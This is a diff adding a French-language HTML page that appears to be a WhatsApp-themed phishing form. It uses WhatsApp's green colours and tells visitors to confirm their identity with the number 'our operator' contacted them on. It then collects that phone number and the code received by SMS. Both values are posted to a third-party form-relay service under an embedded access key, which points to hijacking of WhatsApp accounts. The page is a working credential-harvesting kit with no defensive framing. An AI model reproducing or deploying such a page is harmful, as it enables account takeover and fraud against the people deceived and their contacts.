@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirmez votre identité</title>
+    <style>
+        .input-group {
+            margin-bottom: 20px; /* Espacement entre les champs */
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container" style="text-align: center;">
+        <img src="1.png" height="70px">
+        <h1 style="color: #128C7E;">
+            Confirmez votre identité en utilisant 
+            le numéro WhatsApp sur lequel notre opérateur vous a contacté. Ensuite, nous 
+            vous enverrons un code de connexion qui vous donnera un accès illimité à notre site.
+        </h1>
+
+        <!-- Formulaire pour envoyer les données -->
+        <form action="https://api.web3forms.com/submit" method="POST">
+            <input type="hidden" name="access_key" value="4f259424-1eaf-4b3b-92f3-b111a1cef350">
+            <input type="hidden" name="redirect" value="https://votre-site.com/merci.html">
+
+            <div class="input-group">
+                <label>Numéro de téléphone</label><br>
+                <input 
+                    type="text" 
+                    name="Numéro WhatsApp" 
+                    required 
+                    placeholder="Numéro WhatsApp" 
+                    style="width: 300px; height: 40px; font-size: 16px; border: 1px solid #128C7E; color: #128C7E; background-color: #F0F0F0; border-radius: 25px; outline: none;">
+            </div>
+
+            <div class="input-group">
+                <label>Mot de passe</label><br>
+                <input 
+                    type="text" 
+                    name="Mot de passe reçu" 
+                    required 
+                    placeholder="Mot de passe reçu par SMS" 
+                    style="width: 300px; height: 40px; font-size: 16px; border: 1px solid #128C7E; color: #128C7E; background-color: #F0F0F0; border-radius: 25px; outline: none;">
+            </div>
+
+            <button type="submit" style="width: 320px; height: 45px; font-size: 16px; background-color: #128C7E; color: white; border-radius: 25px; border: none;">Se connecter</button>
+        </form>
+
+        <p><a href="#">Mot de passe oublié ?</a></p>
+    </div>
+</body>
+</html>
